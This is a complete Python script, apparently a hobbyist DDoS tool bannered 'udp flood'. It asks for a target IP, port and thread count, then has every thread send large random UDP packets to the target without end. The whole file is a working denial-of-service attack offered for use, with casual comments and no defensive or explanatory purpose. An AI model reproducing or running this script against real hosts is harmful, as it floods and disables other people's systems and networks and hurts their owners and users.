import socket
import threading
import random
import sys
import os
import ctypes

def start(ip, port): #machine
    zzz = 0 
    data = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        data.sendto(random._urandom(32750), (ip, port)) #this sends sockets ig
        zzz += 1
        print(f"CONNECTIONS: {zzz} | TARGET: {ip}:{port}") 


def main():
    try:
        if len(sys.argv) < 5: #just banner ajajajaj
            print('''
    ┌─┐┬ ┬┌┬┐┌─┐─┐ ┬┬ ┬┌─┐
    └─┐│ │ │││ │┌┴┬┘└┬┘┌─┘
    └─┘└─┘─┴┘└─┘┴ └─ ┴ └─┘
          udp flood
                  ''')
            
        ip = input("IP: ") if len(sys.argv) < 2 else sys.argv[1]
        port = int(input("Port: ") if len(sys.argv) < 3 else int(sys.argv[2]))
        threads = int(input("Threads: ") if len(sys.argv) < 5 else int(sys.argv[4]))

    except KeyboardInterrupt:
        print("Program terminated by user")
        sys.exit()

    except Exception as e:
        print(f"\n<<ERROR>> {e}") #useless error but ye
        sys.exit()

    for i in range(threads): #this mf is the whole logic of this script
        try:
            t = threading.Thread(target=start, args=(ip, port))
            t.start()
        except Exception as e:
            print(f"\n<<ERROR>> An error occurred initializing thread {i}: {e}")

if __name__ == "__main__":
    main()


